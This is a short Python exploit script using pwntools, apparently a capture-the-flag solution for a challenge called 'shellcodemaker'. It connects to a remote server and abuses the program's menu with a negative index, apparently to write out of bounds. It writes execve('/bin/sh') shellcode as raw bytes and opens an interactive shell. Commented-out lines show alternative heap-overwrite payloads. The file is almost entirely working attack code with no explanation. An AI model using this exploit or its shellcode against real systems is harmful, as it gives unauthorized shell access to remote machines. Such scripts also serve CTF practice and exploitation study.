#shellcodemaker
from pwn import *

r = remote('128.199.104.41', 23170)
# r = process('./shellcodemaker')

def create_shellcode(data, index):
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	r.sendline('1') # option
	r.sendline(index) # index
	r.sendline(str(len(data) + 1)) # size
	r.sendline(data) # data
	print(r.recvline())

def delete_shellcode(index):
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	print(r.recvline())
	r.sendline('2') # option
	r.sendline(index)
	print(r.recvline())


create_shellcode('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05', '-17')
create_shellcode('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05', '0')
# create_shellcode('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05', '2')
# create_shellcode('B'*32 + '\x65', '1')
# create_shellcode('C'*100 + p32(0xfffffffc) + p32(0xfffffffc) + p32(0x404014) + p32(0x405668), '2')
delete_shellcode('0')
# delete_shellcode('1')
# delete_shellcode('0')
r.interactive()